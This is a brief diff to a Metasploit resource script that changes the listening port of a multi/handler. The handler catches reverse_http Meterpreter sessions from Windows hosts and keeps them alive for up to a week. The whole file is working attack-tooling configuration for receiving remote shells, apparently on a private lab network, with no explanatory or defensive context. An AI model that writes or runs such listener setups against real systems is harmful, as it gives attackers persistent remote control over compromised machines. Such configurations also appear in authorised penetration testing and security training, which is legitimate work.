@@ -1,7 +1,7 @@
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_http
 set LHOST 192.168.56.10
-set LPORT 8080
+set LPORT 8071
 set SessionCommunicationTimeout 300
 set SessionExpirationTimeout 604800
 exploit -j
